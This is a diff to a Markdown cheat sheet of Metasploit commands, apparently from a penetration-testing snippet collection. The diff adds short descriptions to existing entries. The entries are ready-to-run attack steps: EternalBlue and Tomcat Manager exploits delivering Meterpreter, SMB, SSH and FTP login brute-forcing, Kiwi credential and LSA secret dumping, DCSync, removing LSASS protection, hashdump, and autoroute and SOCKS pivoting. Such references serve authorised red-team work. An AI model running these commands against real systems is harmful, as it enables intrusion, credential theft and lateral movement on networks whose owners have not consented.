@@ -6,6 +6,8 @@
 
 List sessions with Metasploit.
 
+List active Metasploit sessions.
+
 ```sh title:"Metasploit List Sessions"
 sessions -l
 ```
@@ -14,6 +16,8 @@ sessions -l
 ### Upgrade session
 
 Spawn upgrade session with Metasploit.
+
+Upgrade a shell session to Meterpreter.
 
 ```sh title:"Metasploit Spawn Upgrade Session"
 sessions -u "$session_id"
@@ -26,6 +30,8 @@ var session_id
 
 Run route table with Metasploit.
 
+Print Metasploit's route table.
+
 ```sh title:"Metasploit Run Route Table"
 route print
 ```
@@ -36,6 +42,8 @@ route print
 ### Autoroute
 
 Run autoroute with Metasploit.
+
+Use the autoroute module for a session.
 
 ```sh title:"Metasploit Run Autoroute"
 use multi/manage/autoroute
@@ -50,6 +58,8 @@ var session_id
 
 Start SOCKS proxy with Metasploit.
 
+Start a Metasploit SOCKS proxy after adding routes.
+
 ```sh title:"Metasploit Start SOCKS Proxy"
 use auxiliary/server/socks_proxy
 set SRVHOST 127.0.0.1
@@ -63,6 +73,8 @@ run -j
 
 Run load kiwi with Metasploit.
 
+Load Kiwi into Meterpreter.
+
 ```sh title:"Metasploit Run Load Kiwi"
 load kiwi
 ```
@@ -71,6 +83,8 @@ load kiwi
 ### Dump credentials
 
 Dump credentials with Metasploit.
+
+Dump credentials with Kiwi.
 
 ```sh title:"Metasploit Dump Credentials"
 creds_all
@@ -81,6 +95,8 @@ creds_all
 
 Dump SAM and secrets with Metasploit.
 
+Dump SAM and LSA secrets with Kiwi.
+
 ```sh title:"Metasploit Dump SAM and Secrets"
 lsa_dump_sam
 lsa_dump_secrets
@@ -90,6 +106,8 @@ lsa_dump_secrets
 ### DCSync
 
 Execute DCSync with Metasploit.
+
+Run Kiwi DCSync against a domain controller.
 
 ```sh title:"Metasploit Execute DCSync"
 dcsync "$domain_controller_name"
@@ -102,6 +120,8 @@ var domain_controller_name
 
 Execute process with Metasploit.
 
+Create a hidden process from Meterpreter.
+
 ```sh title:"Metasploit Execute Process"
 execute -H -f "$process"
 ```
@@ -113,6 +133,8 @@ var process := notepad.exe
 
 Run migrate by name with Metasploit.
 
+Migrate Meterpreter into a process by name.
+
 ```sh title:"Metasploit Run Migrate by Name"
 migrate -N "$process_name"
 ```
@@ -123,6 +145,8 @@ var process_name := notepad.exe
 ### Remove PPL
 
 Remove PPL with Metasploit.
+
+Remove LSASS process protection with Kiwi, then dump credentials.
 
 ```sh title:"Metasploit Remove PPL"
 load kiwi
@@ -137,6 +161,8 @@ creds_all
 
 Run LAPS with Metasploit.
 
+Use the Windows LAPS gather module.
+
 ```sh title:"Metasploit Run LAPS"
 use post/windows/gather/laps
 set SESSION $session_id
@@ -149,6 +175,8 @@ var session_id
 ### EternalBlue x64
 
 Execute EternalBlue x64 with Metasploit.
+
+Run MS17-010 EternalBlue with x64 Meterpreter payload.
 
 ```sh title:"Metasploit Execute EternalBlue X64"
 use exploit/windows/smb/ms17_010_eternalblue
@@ -168,6 +196,8 @@ var lport
 
 Scan SMB login with Metasploit.
 
+Run SMB login scanner with username and password files.
+
 ```sh title:"Metasploit Scan SMB Login"
 use auxiliary/scanner/smb/smb_login
 set RHOSTS $rhost_ip
@@ -184,6 +214,8 @@ var pass_file
 ### SSH login
 
 Scan SSH login with Metasploit.
+
+Run SSH login scanner with username and password files.
 
 ```sh title:"Metasploit Scan SSH Login"
 use auxiliary/scanner/ssh/ssh_login
@@ -202,6 +234,8 @@ var pass_file
 
 Scan FTP login with Metasploit.
 
+Run FTP login scanner with username and password files.
+
 ```sh title:"Metasploit Scan FTP Login"
 use auxiliary/scanner/ftp/ftp_login
 set RHOSTS $rhost_ip
@@ -218,6 +252,8 @@ var pass_file
 ### Tomcat manager deploy
 
 Read tomcat manager deploy with Metasploit.
+
+Deploy a Meterpreter payload through Tomcat Manager.
 
 ```sh title:"Metasploit Read Tomcat Manager Deploy"
 use exploit/multi/http/tomcat_mgr_deploy
@@ -243,6 +279,8 @@ var lport
 
 Dump hashdump with Metasploit.
 
+Run the Windows hashdump post module.
+
 ```sh title:"Metasploit Dump Hashdump"
 use post/windows/gather/hashdump
 set SESSION $session_id
@@ -255,6 +293,8 @@ var session_id
 ### Credential collector
 
 Dump credential collector with Metasploit.
+
+Run the Windows credential collector post module.
 
 ```sh title:"Metasploit Dump Credential Collector"
 use post/windows/gather/credentials/credential_collector
